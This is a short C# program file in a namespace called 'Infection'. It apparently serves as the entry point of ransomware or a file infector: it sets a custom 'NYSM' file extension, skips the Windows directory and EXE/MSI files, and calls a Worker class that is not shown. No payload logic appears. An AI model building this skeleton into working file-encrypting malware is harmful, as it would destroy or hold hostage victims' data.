using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Infection
{
    class Program
    {
        private static string EXT = "NYSM";
        private static string[] EXCLUDE_DIRS = new string[] { @"C:\Windows" };
        private static string[] EXCLUDE_FILES = new string[] { };
        private static string[] EXCLUDE_EXTS = new string[] { @"EXE", @"MSI" };

        static void Main(string[] args)
        {
            Worker.Instance(EXT).Run(EXCLUDE_DIRS, EXCLUDE_FILES, EXCLUDE_EXTS);
        }
    }
}
